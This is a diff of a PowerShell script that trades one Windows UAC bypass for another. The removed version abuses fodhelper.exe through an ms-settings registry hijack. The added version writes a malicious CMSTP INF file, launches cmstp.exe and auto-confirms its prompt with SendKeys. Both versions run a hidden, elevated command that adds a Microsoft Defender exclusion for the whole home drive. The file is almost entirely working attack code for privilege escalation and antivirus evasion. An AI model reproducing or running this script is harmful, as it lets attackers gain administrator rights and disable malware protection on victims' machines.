@@ -1,128 +1,132 @@
-# Get the Desktop path
-try {
-    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-} catch {
-    Write-Error "Failed to retrieve the Desktop path. Exiting script."
-    exit
+Function script:Set-INFFile {
+[CmdletBinding()]
+	Param (
+	[Parameter(HelpMessage="Specify the INF file location")]
+	$InfFileLocation = "$env:temp\CMSTP.inf",
+	
+	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
+	[String]$CommandToExecute = 'cmd.exe /c powershell.exe Set-MpPreference -ExclusionPath $env:HOMEDRIVE'
+	)
+
+$InfContent = @"
+[version]
+Signature=`$chicago`$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+$CommandToExecute
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+
+[Strings]
+ServiceName="CorpVPN"
+ShortSvcName="CorpVPN"
+
+"@
+
+$InfContent | Out-File $InfFileLocation -Encoding ASCII
 }
 
-# Define the hidden folder path
-$hiddenFolderPath = Join-Path -Path $desktopPath -ChildPath ".hiddenFolder"
 
-# Ensure the hidden folder exists
-try {
-    if (-not (Test-Path $hiddenFolderPath)) {
-        New-Item -Path $hiddenFolderPath -ItemType Directory -Force | Out-Null
-        Write-Host "Hidden folder created at: $hiddenFolderPath"
-    } else {
-        Write-Host "Hidden folder already exists at: $hiddenFolderPath"
-    }
-
-    # Set folder attributes to hidden and system
-    attrib +s +h $hiddenFolderPath
-} catch {
-    Write-Error "Failed to create or update attributes for the hidden folder. Exiting script."
-    exit
-}
-
-# Generate a unique name for a copied PowerShell executable
-$uniqueExeNamePowershell = [guid]::NewGuid().ToString() + ".exe"
-$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $uniqueExeNamePowershell
-
-try {
-    # Copy PowerShell.exe to the hidden folder with a unique name
-    $sourcePowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-    if (Test-Path $sourcePowershellPath) {
-        Copy-Item -Path $sourcePowershellPath -Destination $destinationPathPowershell -Force
-        Write-Host "PowerShell executable copied to: $destinationPathPowershell"
-    } else {
-        Write-Error "Source PowerShell executable not found at $sourcePowershellPath. Exiting script."
-        exit
-    }
-} catch {
-    Write-Error "Failed to copy PowerShell executable. Exiting script."
-    exit
-}
-
-# Base64-encoded command to exclude $env:HOMEDRIVE from Defender
-$DefenderExclusionBase64 = "UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAZQBuAHYAOgBIAE8ATQBFAEQAUgBJAFYARQA="
-
-# Create a registry key for a custom command
-$regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"
-
-try {
-    # Create the registry key and set required properties
-    New-Item -Path $regKeyPath -Force | Out-Null
-    New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-
-    # Define the payload command
-    $command = "$destinationPathPowershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $DefenderExclusionBase64"
-
-    Set-ItemProperty -Path $regKeyPath -Name "(Default)" -Value $command -Force
-    Write-Host "Registry key created and command set."
-} catch {
-    Write-Error "Failed to configure the registry key. Exiting script."
-    exit
-}
-
-# Trigger UAC bypass via Fodhelper
-try {
-    $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
-    if (Test-Path $fodhelperPath) {
-        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden
-        Write-Host "Fodhelper.exe executed."
-    } else {
-        Write-Error "Fodhelper.exe not found. Exiting script."
-        exit
-    }
-} catch {
-    Write-Error "Failed to execute fodhelper.exe. Exiting script."
-    exit
-}
-
-# Dynamic Wait
-try {
-    # Check if PowerShell executable is still running
-    $isPowershellRunning = $true
-    Write-Host "Executing UAC-Bypassed Powershell w/ FodHelper-Registry-set-command: $($command)"
-    while ($isPowershellRunning) {
-        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
-        if ($process -eq $null) {
-            $isPowershellRunning = $false
-            Write-Host "PowerShell process completed."
+Function Get-Hwnd
+{
+  [CmdletBinding()]
+    
+  Param
+  (
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
+  )
+  Process
+    {
+        $ErrorActionPreference = 'Stop'
+        Try 
+        {
+            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
         }
-        Start-Sleep -Seconds 3
+        Catch 
+        {
+            $hwnd = $null
+        }
+        $hash = @{
+        ProcessName = $ProcessName
+        Hwnd        = $hwnd
+        }
+        
+    New-Object -TypeName PsObject -Property $hash
     }
-} catch {
-    Write-Error "Error during dynamic wait. Exiting script."
-    exit
 }
 
-# Clean up the registry key after execution
-try {
-    if (Test-Path $regKeyPath) {
-        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-        Write-Host "Registry key cleaned up."
+function Set-WindowActive
+{
+  [CmdletBinding()]
+
+  Param
+  (
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
+  )
+  
+  Process
+  {
+    $memberDefinition = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+
+'@
+
+    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
+    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
+    If ($hwnd) 
+    {
+      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
+      [User32.Api]::SetForegroundWindow($hwnd)
+      [User32.Api]::ShowWindow($hwnd, 5)
     }
-} catch {
-    Write-Warning "Failed to clean up the registry key. Please remove it manually if necessary."
+    Else 
+    {
+      [string] $hwnd = 'N/A'
+    }
+
+    $hash = @{
+      Process = $Name
+      Hwnd    = $hwnd
+    }
+        
+    New-Object -TypeName PsObject -Property $hash
+  }
 }
 
-# Clean up rest
-try {
-    # Remove hidden folder attributes and delete it
-    attrib -s -h $hiddenFolderPath
-    if (Test-Path $hiddenFolderPath) {
-        Remove-Item -Path $hiddenFolderPath -Recurse -Force
-        Write-Host "Hidden folder and its contents have been cleaned up."
-    } else {
-        Write-Host "Hidden folder does not exist or has already been deleted."
-    }
-} catch {
-    Write-Warning "Failed to clean up the hidden folder. Please remove it manually if necessary."
+. Set-INFFile
+#Needs Windows forms
+add-type -AssemblyName System.Windows.Forms
+If (Test-Path $InfFileLocation) {
+#Command to run
+$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
+$ps.Arguments = "/au $InfFileLocation"
+$ps.UseShellExecute = $false
+
+#Start it
+[system.diagnostics.process]::Start($ps)
+
+do
+{
+	# Do nothing until cmstp is an active window
 }
+until ((Set-WindowActive cmstp).Hwnd -ne 0)
 
-# Script completed successfully
-Write-Host "Script completed. All operations executed."
-exit
 
+#Activate window
+Set-WindowActive cmstp
+
+#Send the Enter key
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+}
